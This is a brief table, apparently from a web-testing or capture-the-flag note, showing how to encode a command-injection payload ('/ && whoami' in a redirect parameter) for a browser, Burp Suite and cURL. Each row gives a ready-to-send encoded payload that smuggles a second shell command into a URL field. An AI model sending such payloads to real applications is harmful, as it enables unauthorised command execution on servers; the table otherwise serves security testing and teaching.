| Tool | Space Behavior | Ampersand (&) Behavior | Final Payload Look |
|---|---|---|---|
| Browser | Must be %20 | Must be %26%26 | redirect=/%20%26%26%20whoami |
| Burp Suite | Raw space breaks HTTP; use %20 | Raw & splits parameters; use %26%26 | redirect=%2f%20%26%26%20whoami |
| cURL | Must be enclosed in quotes | Must be enclosed in quotes or encoded | 'URL?redirect=%2f%20%26%26%20whoami' |

